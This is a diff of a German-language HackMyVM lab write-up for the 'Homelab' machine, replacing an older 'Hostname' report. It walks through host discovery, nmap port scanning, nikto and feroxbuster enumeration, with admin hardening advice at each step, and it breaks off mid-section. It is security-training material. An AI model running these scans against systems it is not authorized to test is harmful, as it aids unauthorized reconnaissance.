@@ -1,21 +1,23 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hostname - HackMyVM - Bericht</title>
+    <title>Homelab - HackMyVM - Medium - HackMyVM - Bericht</title>
     <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
     <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
 </head>
-<body>
+ <body>
+ 
     <div class="header-bg">
-        <h1>Hostname - HackMyVM - Level: Easy - Bericht</h1>
+        <h1>Homelab - HackMyVM - Medium - HackMyVM - Level: Medium - Bericht</h1>
         <div class="level-container">
-            <h2 style="color:green;">Easy</h2>
+            <h2>Medium</h2>
             <div class="circle">
-                <div class="segment segment-1" style="background-color: green;"></div>
-                <div class="segment segment-2" style="background-color: green;"></div>
-                <div class="segment segment-3" style="background-color: green;"></div>
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
                 <div class="inner"></div>
             </div>
         </div>
@@ -25,15 +27,33 @@
         <section class="tools-used">
             <h2>Verwendete Tools</h2>
             <div class="tools-grid">
+                <div class="tool-item">netdiscover</div>
                 <div class="tool-item">nmap</div>
-                <div class="tool-item">gobuster</div>
-                <div class="tool-item">steghide</div>
-                <div class="tool-item">stegseek</div>
-                <div class="tool-item">stegsnow</div>
-                <div class="tool-item">hydra</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">cut</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">openssl</div>
+                <div class="tool-item">pem2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">bash (Scripting)</div>
+                <div class="tool-item">openvpn</div>
+                <div class="tool-item">ip</div>
+                <div class="tool-item">ping</div>
                 <div class="tool-item">ssh</div>
-                <div class="tool-item">nc</div>
-                <!-- Hier weitere Tools einfügen -->
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">whoami</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">mv</div>
             </div>
         </section>
 
@@ -43,6 +63,7 @@
                 <li><a href="#reconnaissance">Reconnaissance</a></li>
                 <li><a href="#web-enumeration">Web Enumeration</a></li>
                 <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept-privesc">Proof of Concept: Privilege Escalation (shinosawa zu root)</a></li>
                 <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                 <li><a href="#flags">Flags</a></li>
             </ul>
@@ -50,531 +71,1825 @@
 
         <section id="reconnaissance">
             <h2>Reconnaissance</h2>
-            <p class="comment">
-                In dieser Phase führen wir eine erste Aufklärung durch, um Informationen über das Zielsystem zu sammeln. Dies beinhaltet das Scannen des Netzwerks, um aktive Hosts zu identifizieren, und das Überprüfen offener Ports und Dienste.
-                <br>
-                <b>Analyse:</b> Die Reconnaissance ist entscheidend, um ein Verständnis der Netzwerkstruktur und der potenziellen Angriffsfläche zu gewinnen.
-                <br>
-                <b>Empfehlung:</b> Verwenden Sie verschiedene Tools und Techniken, um ein umfassendes Bild des Zielsystems zu erhalten.
+            
+            <p class="analysis"><strong>Analyse:</strong>
+                Der erste Schritt in unserem Penetrationstest ist die aktive Aufklärung des Zielnetzwerks. Wir beginnen mit dem Tool <code>netdiscover</code>, um aktive Hosts im Subnetz <code>192.168.2.1/24</code> zu identifizieren. Das Ziel ist es, die IP-Adresse unserer Zielmaschine, "Homelab", zu finden.
+                Der Befehl <code>netdiscover -r 192.168.2.1/24</code> weist <code>netdiscover</code> an, ARP-Requests im angegebenen Netzwerkbereich zu senden.
             </p>
             <div class="code-block">
                 <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">arp-scan -l</span>
-                    </div>
-                </div>
-                <div class="terminal">
-                    192.168.2.112 08:00:27:69:3b:76 PCS Systemtechnik GmbH
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat]
+└─# <span class="command">netdiscover -r 192.168.2.1/24</span></div>
+                    <pre>
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                               
+                                                                                             
+ <span class="command">11 Captured ARP Req/Rep packets, from 8 hosts.</span>   Total size: 660                            
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+                   
+ <span class="command">192.168.2.191</span>   <span class="command">08:00:27:58:13:e0</span>      1      60  <span class="command">PCS Systemtechnik GmbH</span>    
+</pre>
                 </div>
             </div>
-            <p class="comment">
-                <code>arp-scan -l</code> listet alle Geräte im lokalen Netzwerk auf. Hier sehen wir, dass sich ein Gerät mit der IP-Adresse 192.168.2.112 im Netzwerk befindet.
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die Ausgabe von <code>netdiscover</code> ist erfolgreich. Es wurden 11 ARP-Pakete von 8 Hosts erfasst. Ein Host mit der IP-Adresse <code>192.168.2.191</code> und der MAC-Adresse <code>08:00:27:58:13:e0</code> wurde identifiziert. Die MAC-Adresse gehört zu "PCS Systemtechnik GmbH", was oft ein Hinweis auf eine virtuelle Maschine von Oracle VirtualBox ist. Diese IP-Adresse ist unser primäres Ziel für die weiteren Scans.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Die identifizierte IP-Adresse sollte als nächstes mit Port-Scanning-Tools wie <code>nmap</code> untersucht werden, um offene Ports und laufende Dienste zu ermitteln.
                 <br>
-                <b>Analyse:</b> ARP-Scan hilft, aktive Hosts im lokalen Netzwerk zu identifizieren. Die MAC-Adresse kann zur Geräteerkennung verwendet werden.
-                <br>
-                <b>Empfehlung:</b> Verwenden Sie ARP-Scan, um schnell einen Überblick über die aktiven Geräte im Netzwerk zu erhalten.
+                <strong>Empfehlung (Admin):</strong>
+                Netzwerk-Monitoring-Systeme sollten ungewöhnliche ARP-Scan-Aktivitäten erkennen und alarmieren. Eine Segmentierung des Netzwerks kann die Sichtbarkeit von Hosts für nicht autorisierte Scanner einschränken. Die Verwendung von statischen ARP-Einträgen für kritische Systeme kann ARP-Spoofing-Versuche erschweren, ist aber in dynamischen Umgebungen oft unpraktisch.
             </p>
 
+            <p class="analysis"><strong>Analyse:</strong>
+                Nachdem wir die IP-Adresse des Ziels (<code>192.168.2.191</code>) identifiziert haben, führen wir einen umfassenden Portscan mit <code>nmap</code> durch.
+                Der Befehl <code>nmap -sS -sC -p- -AO 192.168.2.191 -Pn --min-rate 5000</code> ist wie folgt aufgebaut:
+                <ul>
+                    <li><code>-sS</code>: Führt einen TCP SYN-Scan (Stealth Scan) durch, der oft weniger auffällig ist als ein voller TCP-Connect-Scan.</li>
+                    <li><code>-sC</code>: Führt Standard-Nmap-Skripte (NSE) aus, um zusätzliche Informationen über die erkannten Dienste zu sammeln.</li>
+                    <li><code>-p-</code>: Scannt alle 65535 TCP-Ports.</li>
+                    <li><code>-AO</code>: Versucht, das Betriebssystem zu identifizieren. (Hinweis: <code>-A</code> ist umfassender und beinhaltet OS-Detektion, Versionserkennung, Skript-Scanning und Traceroute. <code>-O</code> ist nur OS-Detektion. Die Kombination <code>-AO</code> ist unüblich, <code>-A</code> wäre hier gängiger oder <code>-O</code> separat.)</li>
+                    <li><code>-Pn</code>: Überspringt die Host-Discovery-Phase (Ping-Scan) und nimmt an, dass der Host online ist. Dies ist nützlich, wenn Hosts ICMP-Anfragen blockieren.</li>
+                    <li><code>--min-rate 5000</code>: Setzt die minimale Paketrate auf 5000 Pakete pro Sekunde, um den Scan zu beschleunigen.</li>
+                </ul>
+            </p>
             <div class="code-block">
                 <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.112 -p-</span>
-                    </div>
-                </div>
-                <div class="terminal">
-Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 17:58 CEST<br>
-Nmap scan report for hostname (192.168.2.112)<br>
-Host is up (0.00012s latency).<br>
-Not shown: 65533 closed tcp ports (reset)<br>
-PORT   STATE SERVICE VERSION<br>
-22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>
-| ssh-hostkey:<br>
-|   3072 27712458d37cb38a7b3249d1c80b4cba (RSA)<br>
-|   256 e23067387bdb9a8621013ebf0ee74f26 (ECDSA)<br>
-|_  256 5d78c537a858ddc4b6bdceb5babf53dc (ED25519)<br>
-80/tcp open  http    nginx 1.18.0<br>
-|_http-title: Panda<br>
-|_http-server-header: nginx/1.18.0<br>
-MAC Address: 08:00:27:69:3B:76 (Oracle VirtualBox virtual NIC)<br>
-Device type: general purpose<br>
-Running: Linux 4.X|5.X<br>
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>
-OS details: Linux 4.15 - 5.6<br>
-Network Distance: 1 hop<br>
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>
-TRACEROUTE<br>
-HOP RTT     ADDRESS<br>
-1   0.12 ms hostname (192.168.2.112)
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat]
+└─# <span class="command">nmap -sS -sC -p- -AO 192.168.2.191 -Pn  --min-rate 5000</span></div>
+                    <pre>
+Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at <span class="command">2025-05-14 23:38 CEST</span>
+Nmap scan report for <span class="command">homelab.hmv (192.168.2.191)</span>
+Host is up (0.00019s latency).
+Not shown: 65534 closed tcp ports (reset)
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Unix))</span>
+<span class="command">|_http-favicon: Apache on Mac OS X</span>
+<span class="command">|_http-server-header: Apache/2.4.62 (Unix)</span>
+<span class="command">| http-methods:</span> 
+<span class="command">|_  Potentially risky methods: TRACE</span>
+<span class="command">|_http-title: Mac OS X Server</span>
+MAC Address: <span class="command">08:00:27:58:13:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: <span class="command">general purpose</span>
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.19</span>
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.19 ms homelab.hmv (192.168.2.191)
+
+OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/].
+Nmap done: 1 IP address (1 host up) scanned in 10.46 seconds
+</pre>
                 </div>
             </div>
-            <p class="comment">
-                Nmap identifizierte die offenen Ports 22 (SSH) und 80 (HTTP). Der Hostname ist "hostname" und der HTTP-Titel ist "Panda".
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der <code>nmap</code>-Scan war sehr erfolgreich und liefert wichtige Informationen:
+                <ul>
+                    <li>Es ist nur ein einziger TCP-Port offen: Port <code>80</code> (HTTP).</li>
+                    <li>Auf Port 80 läuft ein <code>Apache httpd 2.4.62 ((Unix))</code> Webserver.</li>
+                    <li>Das Favicon und der HTTP-Titel (<code>Mac OS X Server</code>) deuten stark darauf hin, dass es sich um einen Mac OS X Server handelt. Dies ist ein wichtiger Hinweis, da ältere Mac OS X Server-Versionen bekannte Schwachstellen haben könnten.</li>
+                    <li>Die HTTP-Methode <code>TRACE</code> ist aktiviert, was auf eine mögliche Anfälligkeit für Cross-Site Tracing (XST) hindeutet.</li>
+                    <li>Obwohl Nmap auf ein Linux-Kernel (4.X/5.X) tippt, widersprechen die anderen Indikatoren (Favicon, Titel) dem. Dies könnte auf eine Virtualisierungsumgebung oder eine spezifische Konfiguration des Apache-Servers zurückzuführen sein, die Linux-ähnliche Signaturen erzeugt, obwohl das zugrundeliegende System Mac OS X ist. Angesichts der anderen Hinweise ist Mac OS X wahrscheinlicher.</li>
+                    <li>Die MAC-Adresse bestätigt erneut, dass es sich wahrscheinlich um eine VirtualBox VM handelt.</li>
+                </ul>
+                Der Hostname <code>homelab.hmv</code> wird ebenfalls aufgedeckt.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Der nächste logische Schritt ist die detaillierte Untersuchung des Webservers auf Port 80. Dazu gehören Directory Brute-Forcing, Schwachstellen-Scans (z.B. mit <code>nikto</code>) und die manuelle Inspektion der Webseite. Der Hostname <code>homelab.hmv</code> sollte der lokalen <code>/etc/hosts</code> Datei hinzugefügt werden, um die Webseite über diesen Namen aufrufen zu können.
                 <br>
-                <b>Analyse:</b> Nmap ist ein leistungsstarkes Tool zur Port- und Diensterkennung. Die Ergebnisse geben Aufschluss über die auf dem Zielsystem laufenden Dienste und deren Versionen.
+                <strong>Empfehlung (Admin):</strong>
+                Die HTTP-Methode <code>TRACE</code> sollte deaktiviert werden, wenn sie nicht explizit benötigt wird, um XST-Angriffe zu mitigieren. Server-Banner und Titel, die detaillierte Betriebssysteminformationen preisgeben (wie "Mac OS X Server"), sollten minimiert oder verallgemeinert werden, um die Informationsgewinnung für Angreifer zu erschweren. Regelmäßige Überprüfung und Deaktivierung nicht benötigter Dienste und Ports ist essenziell. Die OS-Detektion durch Nmap kann manchmal ungenau sein; hier ist es wichtig, alle Indikatoren zu berücksichtigen.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Um die Ausgabe des vorherigen <code>nmap</code>-Scans zu filtern und nur die offenen Ports anzuzeigen, wird der Befehl mit <code>grep open</code> kombiniert. Dies ist eine schnelle Methode, um die relevantesten Informationen aus einer umfangreichen <code>nmap</code>-Ausgabe zu extrahieren.
+                Anschließend wird der Hostname <code>homelab.hmv</code>, der im vorherigen Scan entdeckt wurde, zusammen mit der IP-Adresse <code>192.168.2.191</code> in die lokale <code>/etc/hosts</code>-Datei eingetragen. Dies ermöglicht es uns, den Webserver über seinen Hostnamen statt nur über die IP-Adresse zu erreichen, was für die weitere Web-Enumeration und das Testen von virtuellen Hosts wichtig sein kann. Der Befehl <code>vi /etc/hosts</code> öffnet die Hosts-Datei im Texteditor <code>vi</code> zur Bearbeitung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -p- -AO 192.168.2.191 -Pn  --min-rate 5000| grep open</span></div>
+                    <pre><span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Unix))</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>                           
+                <span class="command">192.168.2.191   homelab.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Das Filtern der <code>nmap</code>-Ausgabe bestätigt erneut, dass Port 80 (HTTP) der einzige offene TCP-Port ist.
+                Das Hinzufügen des Eintrags zur <code>/etc/hosts</code>-Datei ist eine bewährte Praxis im Penetrationstesting. Es stellt sicher, dass Anfragen an <code>homelab.hmv</code> korrekt zur IP-Adresse <code>192.168.2.191</code> aufgelöst werden, was besonders wichtig ist, wenn Webanwendungen auf Hostnamen-basierte Konfigurationen angewiesen sind.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Nachdem der Hostname konfiguriert wurde, sollte die Webseite <code>http://homelab.hmv/</code> im Browser aufgerufen und mit Web-Enumeration-Tools weiter untersucht werden.
                 <br>
-                <b>Empfehlung:</b> Überprüfen Sie die erkannten Dienste auf bekannte Schwachstellen und aktualisieren Sie sie gegebenenfalls.
+                <strong>Empfehlung (Admin):</strong>
+                Aus Sicht der Systemadministration ist hier keine direkte Aktion erforderlich, da die Änderung der <code>/etc/hosts</code>-Datei auf dem Angreifer-System stattfindet. Es verdeutlicht jedoch, wie Angreifer DNS-Namen nutzen, die möglicherweise nicht öffentlich bekannt sind. Interne DNS-Einträge sollten sorgfältig verwaltet werden.
             </p>
         </section>
 
         <section id="web-enumeration">
             <h2>Web Enumeration</h2>
-            <p class="comment">
-                Wir verwenden Gobuster, um versteckte Verzeichnisse und Dateien auf dem Webserver zu finden.
-                <br>
-                <b>Analyse:</b> Web Enumeration ist wichtig, um versteckte Inhalte und potenzielle Schwachstellen aufzudecken, die nicht direkt zugänglich sind.
-                <br>
-                <b>Empfehlung:</b> Verwenden Sie verschiedene Wordlists und Erweiterungen, um eine umfassende Suche durchzuführen.
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Wir setzen die Untersuchung des Webservers auf Port 80 fort. Das Tool <code>nikto</code> wird verwendet, um nach bekannten Webserver-Schwachstellen, Fehlkonfigurationen, veralteten Softwareversionen und anderen potenziellen Sicherheitsproblemen zu suchen.
+                Der Befehl <code>nikto -h http://192.168.2.191</code> weist <code>nikto</code> an, das Ziel unter der angegebenen IP-Adresse zu scannen. Da wir den Hostnamen bereits in <code>/etc/hosts</code> eingetragen haben, könnten wir hier auch <code>http://homelab.hmv</code> verwenden.
             </p>
             <div class="code-block">
                 <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[/home/cyber/Downloads]<br>
-                        └─# <span class="command">gobuster dir -u http://192.168.2.112 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe -t 100</span>
-                    </div>
-                </div>
-                <div class="terminal">
-http://192.168.2.112/index.php            (Status: 200) [Size: 1621]<br>
-http://192.168.2.112/assets               (Status: 403) [Size: 153]
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat]
+└─# <span class="command">nikto -h http://192.168.2.191</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.191</span>
++ Target Hostname:    <span class="command">192.168.2.191</span>
++ Target Port:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-05-14 23:38:43 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.62 (Unix)</span>
++ <span class="password">/: The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ <span class="password">/: The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="command">/favicon.ico: identifies this app/server as: Apache on Mac OS X.</span> See: [Link: https://en.wikipedia.org/wiki/Favicon | Ziel: https://en.wikipedia.org/wiki/Favicon]
++ <span class="command">OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .</span>
++ <span class="password">/: HTTP TRACE method is active which suggests the host is vulnerable to XST.</span> See: [Link: https://owasp.org/www-community/attacks/Cross_Site_Tracing | Ziel: https://owasp.org/www-community/attacks/Cross_Site_Tracing]
++ <span class="command">/service/: Retrieved x-powered-by header: PHP/8.4.5.</span>
++ <span class="command">/service/: This might be interesting.</span>
++ 8101 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2025-05-14 23:39:08 (GMT2) (25 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
                 </div>
             </div>
-            <p class="comment">
-                Gobuster fand die Datei index.php und das Verzeichnis assets. Das Verzeichnis assets ist nicht zugänglich (Status 403).
+            <p class="evaluation"><strong>Bewertung:</strong>
+                <code>nikto</code> liefert mehrere interessante Ergebnisse:
+                <ul>
+                    <li>Bestätigung der Server-Software: <code>Apache/2.4.62 (Unix)</code>.</li>
+                    <li>Fehlende Sicherheitsheader: <code>X-Frame-Options</code> (Schutz gegen Clickjacking) und <code>X-Content-Type-Options</code> (Schutz gegen MIME-Sniffing-Angriffe) sind nicht gesetzt. Dies sind gängige Findings, die die Sicherheit der Webanwendung potenziell schwächen.</li>
+                    <li>Das <code>favicon.ico</code> identifiziert den Server erneut als "Apache on Mac OS X".</li>
+                    <li>Die HTTP-Methode <code>TRACE</code> ist aktiv, was die frühere Vermutung einer XST-Anfälligkeit untermauert.</li>
+                    <li>Ein Verzeichnis <code>/service/</code> wurde gefunden. Dieses Verzeichnis liefert einen <code>X-Powered-By: PHP/8.4.5</code> Header, was darauf hindeutet, dass hier PHP-Skripte ausgeführt werden. Dies ist ein sehr wichtiger Fund, da PHP-Anwendungen oft Schwachstellen aufweisen können.</li>
+                    <li><code>nikto</code> markiert <code>/service/</code> als "This might be interesting", was unsere Aufmerksamkeit auf dieses Verzeichnis lenken sollte.</li>
+                </ul>
+                Die Kombination aus einem Mac OS X Server und PHP ist bemerkenswert und könnte auf spezifische Software oder Konfigurationen hinweisen.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Das Verzeichnis <code>/service/</code> muss als Nächstes gründlich untersucht werden. Directory Brute-Forcing und das Suchen nach PHP-Dateien in diesem Verzeichnis sind angezeigt. Die fehlenden Sicherheitsheader und die aktive TRACE-Methode sind ebenfalls zu dokumentieren, auch wenn sie möglicherweise nicht direkt für einen initialen Zugriff ausgenutzt werden können.
                 <br>
-                <b>Analyse:</b> Gobuster hilft, versteckte Dateien und Verzeichnisse auf dem Webserver zu finden.
-                <br>
-                <b>Empfehlung:</b> Überprüfen Sie die Konfiguration des Webservers und stellen Sie sicher, dass keine unnötigen Dateien oder Verzeichnisse öffentlich zugänglich sind.
+                <strong>Empfehlung (Admin):</strong>
+                Die fehlenden HTTP-Sicherheitsheader (<code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>) sollten in der Webserver-Konfiguration (Apache) gesetzt werden, um die Anwendung gegen Clickjacking und MIME-Sniffing-Angriffe zu härten. Die HTTP-Methode <code>TRACE</code> sollte deaktiviert werden. Die Preisgabe der PHP-Version im <code>X-Powered-By</code>-Header sollte ebenfalls unterbunden werden (<code>expose_php = Off</code> in der <code>php.ini</code>), um Angreifern weniger Informationen zu liefern.
             </p>
 
+            <p class="analysis"><strong>Analyse:</strong>
+                Um versteckte Verzeichnisse und Dateien auf dem Webserver zu finden, setzen wir <code>feroxbuster</code> ein. Dieses Tool führt ein Wordlist-basiertes Brute-Forcing von Verzeichnis- und Dateinamen durch.
+                Der Befehl <code>feroxbuster --url "http://192.168.2.191" --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</code> ist wie folgt konfiguriert:
+                <ul>
+                    <li><code>--url "http://192.168.2.191"</code>: Die Ziel-URL.</li>
+                    <li><code>--wordlist /usr/share/seclists/Discovery/Web-Content/big.txt</code>: Verwendet eine umfangreiche Wortliste für das Brute-Forcing.</li>
+                    <li><code>-x ...</code>: Eine lange Liste von Dateiendungen, nach denen zusätzlich gesucht werden soll (z.B. <code>.php</code>, <code>.txt</code>).</li>
+                    <li><code>-s 200 301 302</code>: Meldet nur Ressourcen, die mit den HTTP-Statuscodes 200 (OK), 301 (Moved Permanently) oder 302 (Found/Redirect) antworten.</li>
+                </ul>
+            </p>
             <div class="code-block">
                 <div class="terminal">
-                    http://192.168.2.112/index.php  <!-- Kung Fu Panda -->
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://192.168.2.191" --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                    <pre>
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.2.191
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">200      GET       75l      215w     2241c http://192.168.2.191/script/serverhome.js</span>
+<span class="command">200      GET       13l       37w     2194c http://192.168.2.191/poweredbymacosxserver.gif</span>
+<span class="command">200      GET      351l     1040w    98713c http://192.168.2.191/script/compressed_widgets.js</span>
+<span class="command">200      GET      192l      384w     3041c http://192.168.2.191/style/iphone.css</span>
+<span class="command">200      GET      412l     2178w   136171c http://192.168.2.191/script/compressed_libraries.js</span>
+<span class="command">200      GET        5l       27w      226c http://192.168.2.191/style/serverhome_static.css</span>
+<span class="command">200      GET      130l      376w     5435c http://192.168.2.191/</span>
+<span class="command">200      GET       12l       63w     3616c http://192.168.2.191/osxserver.gif</span>
+<span class="command">200      GET       33l       97w     6762c http://192.168.2.191/grayx.jpg</span>
+<span class="command">200      GET       96l      250w     3752c http://192.168.2.191/error.html</span>
+<span class="command">200      GET        7l       37w    19156c http://192.168.2.191/favicon.ico</span>
+<span class="command">200      GET      130l      376w     5435c http://192.168.2.191/index.html</span>
+<span class="command">301      GET        9l       28w      313c http://192.168.2.191/script => http://192.168.2.191/script/</span>
+<span class="command">301      GET        9l       28w      314c http://192.168.2.191/service => http://192.168.2.191/service/</span>
+<span class="command">301      GET        9l       28w      312c http://192.168.2.191/style => http://192.168.2.191/style/</span>
+<span class="command">200      GET        1l       10w       59c http://192.168.2.191/service/index.php</span>
+<span class="command">301      GET        9l       28w      316c http://192.168.2.191/style/img => http://192.168.2.191/style/img/</span>
+[####################] - 3m   2868208/2868208 0s      found:17      errors:0      
+[####################] - 57s   573412/573412  10003/s http://192.168.2.191/ 
+[####################] - 2m    573412/573412  4730/s  http://192.168.2.191/script/ 
+[####################] - 2m    573412/573412  4624/s  http://192.168.2.191/service/ 
+[####################] - 2m    573412/573412  4727/s  http://192.168.2.191/style/ 
+[####################] - 86s   573412/573412  6660/s  http://192.168.2.191/style/img/  
+</pre>
                 </div>
             </div>
-            <p class="comment">
-                Im Quellcode von index.php wurde ein Kommentar gefunden: "Kung Fu Panda".
+            <p class="evaluation"><strong>Bewertung:</strong>
+                <code>feroxbuster</code> identifiziert mehrere interessante Dateien und Verzeichnisse:
+                <ul>
+                    <li>Standarddateien und -verzeichnisse einer Mac OS X Server Webseite: <code>/script/</code>, <code>/style/</code>, <code>poweredbymacosxserver.gif</code>, <code>osxserver.gif</code>, <code>favicon.ico</code>, <code>index.html</code>. Darunter auch mehrere JavaScript-Dateien wie <code>serverhome.js</code>, <code>compressed_widgets.js</code> und <code>compressed_libraries.js</code>. Diese könnten analysiert werden, um die Funktionsweise der Webseite besser zu verstehen.</li>
+                    <li>Das bereits von <code>nikto</code> gefundene Verzeichnis <code>/service/</code> wird bestätigt und darin die Datei <code>/service/index.php</code>. Dies ist ein sehr vielversprechender Fund, da PHP-Dateien oft Einstiegspunkte für Angriffe darstellen.</li>
+                </ul>
+                Die Ergebnisse von <code>feroxbuster</code> bestätigen und ergänzen die Funde von <code>nikto</code>. Das Verzeichnis <code>/service/</code> und insbesondere die Datei <code>index.php</code> darin rücken weiter in den Fokus.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Die Datei <code>http://192.168.2.191/service/index.php</code> sollte umgehend im Browser aufgerufen und ihr Quellcode analysiert werden. Auch die gefundenen JavaScript-Dateien sollten heruntergeladen und auf interessante Endpunkte oder Logik untersucht werden.
                 <br>
-                <b>Analyse:</b> Kommentare im Quellcode können Hinweise auf die Funktionalität oder den Zweck der Anwendung geben.
-                <br>
-                <b>Empfehlung:</b> Überprüfen Sie alle Kommentare im Quellcode auf sensible Informationen.
+                <strong>Empfehlung (Admin):</strong>
+                Nicht benötigte Dateien und Verzeichnisse sollten vom Webserver entfernt werden, um die Angriffsfläche zu reduzieren. Der Zugriff auf sensible Konfigurationsdateien oder Skripte sollte streng kontrolliert und protokolliert werden. Directory Listing sollte auf dem Webserver deaktiviert sein, um das Entdecken von Dateien zu erschweren (obwohl Tools wie <code>feroxbuster</code> dies ohnehin versuchen).
             </p>
 
+            <p class="analysis"><strong>Analyse:</strong>
